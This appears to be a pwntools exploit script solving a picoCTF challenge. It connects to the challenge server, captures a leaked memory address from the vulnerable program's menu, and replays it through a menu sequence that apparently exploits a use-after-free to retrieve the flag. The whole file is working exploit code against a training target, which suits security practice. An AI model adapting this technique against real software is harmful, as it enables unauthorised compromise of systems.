#!/usr/bin/python3 
from pwn import *

context.terminal = ["tmux", "split", "-h"]
elf = context.binary = ELF("./vuln")
context.log_level = "info"
context.delete_corefiles = True
context.arch = "x86"

	
io = remote("mercury.picoctf.net", 48259)
#io = process("./vuln")

io.send("s")
io.recvuntil("OOP! Memory leak...")
leak_addr = int(io.recvlineS(), 16)
info("leak addr = %#x", leak_addr)

io.send("i")
io.send("Y")

io.send("l")
io.sendlineafter("anyways:", p32(leak_addr))
io.sendline("e")
print(io.recvall().decode())










